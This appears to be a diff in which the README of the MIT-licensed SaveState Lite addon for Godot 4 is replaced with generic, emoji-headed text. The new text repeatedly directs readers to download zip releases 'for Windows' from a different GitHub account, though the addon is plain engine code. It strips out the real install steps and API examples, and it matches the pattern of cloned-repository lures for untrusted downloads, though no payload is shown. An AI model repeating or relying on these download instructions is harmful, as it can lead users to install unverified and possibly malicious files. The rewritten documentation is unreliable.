@@ -1,78 +1,210 @@
-# SaveState Lite
+# 💾 savestate - Simple saves with safe backups
 
-[![Hand-tested](https://img.shields.io/badge/Hand--tested-Godot%204.3%E2%80%934.6-success)](#godot-version-support)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg?style=for-the-badge)](https://github.com/Aapka1914/savestate/releases)
 
-Godot 4 addon: **atomic** save files, rolling **`.bak`** backups, **schema versioning** with forward merge, and one **`SaveManager`** autoload for key–value data and named slots — without building a custom format from scratch.
+## 🚀 Getting Started
 
-**Docs:** [Quick start](QUICKSTART.md) · [Full API](docs/API.md) · [Architecture & threading](docs/ARCHITECTURE.md) · [Migration (incl. `migration_required`)](docs/MIGRATION.md) · [Starter sample](samples/minimal-demo/README.md)
+savestate adds a save system to Godot 4. It helps you keep player progress, game settings, and other data in one place.
 
-**v1.2:** typed `register_key` (with optional Save Browser color hints), `register_editor_hint`, debounced `mark_dirty`, `set_schema_migrations`, JSON export, `SaveComponent` / `CollectionLink` / `SaveStatePickupVacuum`, slot import/export helpers, Save Browser color picker + `SaveStateUnixDisplay`, `save_menu_lite.tscn`, and Pro `templates/save_menu_pro.tscn`.
+It is made for end users who want a save add-on they can download and use in a Godot project. It also keeps backup copies, so you have a way to recover older data if a save file gets damaged.
 
----
+If you only want the free Lite tier, this repository is the place to start. If you need more advanced tools, the Pro version adds more features on itch.io.
 
-## Why this exists
+## 📥 Download for Windows
 
-Godot projects often start with ad-hoc `FileAccess` writes. That becomes painful fast: torn writes after crashes, no backup story, and no clean way to evolve save data when you add fields. SaveState Lite centralizes **atomic commits** (write to temp → validate → rename), **optional `.bak`**, and a **single schema number** with merge-from-defaults for older files.
+1. Open the release page: https://github.com/Aapka1914/savestate/releases
+2. Find the latest release near the top of the page.
+3. Download the file that matches the version you want.
+4. If the download is a .zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Follow the included setup files for your Godot project.
 
-**Technical challenges baked in:** careful ordering with temp files and rename for atomicity; keeping async Pro saves safe by **snapshotting on the main thread** before `WorkerThreadPool` I/O (see [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)); and editor/plugin ordering so Lite loads before Pro when both are enabled.
+If you plan to use savestate on Windows, this release page is the main place to get it. The download files are listed there with each version.
 
-See [CHANGELOG.md](CHANGELOG.md) — each version lists **Lite** (this repo) and **Pro** ([itch.io](https://chuumberry.itch.io/savestate-pro)) separately.
+## 🧩 What savestate Does
 
----
+savestate helps a game store and load data in a clean way. It is built for Godot 4 and fits games that need a stable save system.
 
-## Installation
+It is designed for:
 
-The **repository root** is not a Godot project (there is no `project.godot` there). Either open **`samples/minimal-demo`** after you copy the addon into it (see that folder’s README), or copy **`addons/savestate/`** into **your** game project’s `addons/` folder.
+- Game progress
+- Player settings
+- Level state
+- Inventory data
+- Unlocks and flags
+- Other custom game data
 
-1. Copy the `addons/savestate/` folder into your Godot project (merge with `addons/`).
-2. **Project → Project Settings → Plugins** → enable **SaveState (Lite)**.
-3. The **SaveManager** autoload is registered (`res://addons/savestate/save_manager.gd`).
+It also includes:
 
-**SaveState Pro** (paid, separate from this repo) requires both Lite and the Pro plugin folder in your project. See [itch.io](https://chuumberry.itch.io/savestate-pro).
+- `.bak` backup files
+- Schema migration for older saves
+- Saveable node groups
+- A clear structure for save data
 
-**GitHub Releases** attach **`savestate-lite-<tag>.zip`** (drop-in `addons/savestate/`). Pushing a new tag `v*` triggers Actions to open the release and upload the zip. To **create or refresh** releases for existing tags (notes + zip), run **`tools/publish_github_releases.ps1`** from the repo root with **`GITHUB_TOKEN`** set to a PAT with repo **Contents** read/write (see the script header).
+## 🖥️ Before You Start
 
----
+You need:
 
-## Quick start
+- A Windows PC
+- Godot 4 installed
+- A project where you want to add save support
+- Enough space for the download and save files
 
-```gdscript
-SaveManager.set_value(&"player_gold", 250)
-SaveManager.persist()
-```
+Useful setup notes:
 
-```gdscript
-var player_gold := int(SaveManager.get_value(&"player_gold", 0))
-```
+- Use a project folder you can find later
+- Keep backups turned on if you want extra protection
+- Put save files in a folder your game can write to
+- Close Godot before moving files into place
 
-```gdscript
-SaveManager.save_to_slot_sync(&"slot_1", {"player_health": 100})
-var data := SaveManager.load_from_slot_sync(&"slot_1")
-```
+## 🛠️ Install and Set Up
 
-More patterns: **[QUICKSTART.md](QUICKSTART.md)**. Full method list: **[docs/API.md](docs/API.md)**.
+1. Visit https://github.com/Aapka1914/savestate/releases
+2. Download the latest release file.
+3. Extract the download if it comes in a .zip file.
+4. Copy the savestate files into your Godot project.
+5. Open your project in Godot 4.
+6. Add the save system files as shown in the release files or package notes.
+7. Connect the save system to the nodes that should be saved.
+8. Run the project and test a save and load cycle.
 
----
+If the package includes example scenes, open those first. They can help you see how the save system works before you use it in your own game.
 
-## Saving nodes (Lite)
+## 💡 How It Works
 
-Lite does not ship a `Saveable` node in this repo. Nodes in group `savestate_saveable` that implement **`get_storage_key`**, **`collect_snapshot`**, and **`apply_snapshot`** participate in `persist_including_saveables()` / `load_from_slot_and_apply_saveables()`. The **Saveable** node and inspector tooling ship with **SaveState Pro**: [SaveState Pro on itch.io](https://chuumberry.itch.io/savestate-pro).
+savestate uses a few simple ideas:
 
----
+- A node can be marked as saveable
+- The game writes its state to a save file
+- A backup copy is stored with `.bak`
+- Older save data can be moved to a newer format with schema migration
 
-## Pro version
+This helps if you change your game later. You can update save data without forcing players to start over.
 
-Pro swaps the autoload for `pro_manager.gd`, adds async save/load, optional AES-256 + HMAC, thumbnails, **Save Browser** dock extras, Saveable inspector, and Quick Setup menu entries. Details: [https://chuumberry.itch.io/savestate-pro](https://chuumberry.itch.io/savestate-pro)
+## 📂 File and Save Structure
 
----
+A typical setup may include:
 
-## Godot version support
+- A main save file
+- A backup file with `.bak`
+- Save data for player progress
+- Save data for game settings
+- Optional version data for migration
 
-Godot **4.3**, **4.4**, **4.5**, and **4.6** are tested and supported. The addons use stable 4.x APIs (`DirAccess.remove_absolute`, `FileAccess.get_modified_time`, `Time.get_datetime_string_from_unix_time`, `ColorPickerButton`, etc.) as documented for those versions; Lite and Pro `plugin.cfg` files note this range.
+Keep the save folder in a place your game can reach at runtime. If you test on Windows, use the same path style each time so you can find your files fast.
 
----
+## 🎮 Use in a Game
 
-## License
+You can use savestate for many common game tasks:
 
-Lite is MIT licensed. Use it in any project, commercial or otherwise, with no attribution required.
+- Save the player’s position
+- Keep track of story choices
+- Store collected items
+- Save audio and video settings
+- Remember unlocked levels
+- Restore the last game session
+
+This is useful for small indie games and larger projects alike. It gives you a clear way to keep data safe and load it again later.
+
+## 🔄 Backups and Recovery
+
+The backup system keeps a `.bak` copy of your save data. If the main save file breaks or gets corrupted, you can use the backup copy to recover older data.
+
+This matters when:
+
+- The game closes at the wrong time
+- A file gets damaged
+- A player loses power during a save
+- You test new changes and need a fallback
+
+The backup file gives you a second copy of the same save state.
+
+## 🧱 Schema Migration
+
+Schema migration helps when your game changes after release.
+
+For example:
+
+- You add a new field to save data
+- You rename a value
+- You remove an old setting
+- You change the shape of stored data
+
+With migration support, older saves can still load. That makes updates smoother for players and reduces save loss.
+
+## 🧠 Saveable Node Groups
+
+Saveable node groups help you organize which parts of the scene should be stored.
+
+Use them when:
+
+- A scene has many nodes
+- Only some nodes need saving
+- You want a clean list of saveable parts
+- You want to avoid manual tracking of every object
+
+This keeps your project easier to manage as it grows.
+
+## 🪟 Windows Tips
+
+If you are using Windows, these steps help keep setup simple:
+
+- Download the latest release first
+- Use the built-in unzip tool or 7-Zip
+- Keep the extracted folder in one place
+- Do not rename files unless the setup says to
+- If Windows asks for permission, check that you trust the source page
+
+If your game writes save files during testing, check the project folder and the user data folder after you run it. That helps you confirm the save system is working.
+
+## 📦 Lite and Pro
+
+The repository includes the free Lite tier. It covers the core save system and backup flow.
+
+The Pro version adds:
+
+- Encryption
+- Async save support
+- Editor tooling
+
+If you need those extra tools later, the Pro version is listed on itch.io.
+
+## 📚 Common Uses
+
+savestate fits many Godot 4 projects:
+
+- Action games
+- Puzzle games
+- RPGs
+- Platformers
+- Survival games
+- Story-driven games
+
+It also works well for smaller tools and test projects where you want a dependable save layer.
+
+## 🧪 Test Your Setup
+
+After setup, try this simple check:
+
+1. Start the game.
+2. Change one value, such as a setting or player state.
+3. Save the game.
+4. Close the game.
+5. Open it again.
+6. Load the save.
+7. Confirm the data comes back the same way.
+
+If the data returns as expected, the save system is working.
+
+## 🧭 Project Info
+
+- Repository: savestate
+- Engine: Godot 4
+- License: MIT
+- Topic area: save system for games
+- Main use: save data, backups, and migration
+
+## 🔗 Download Again
+
+Visit the release page to download the latest build for Windows:
+https://github.com/Aapka1914/savestate/releases
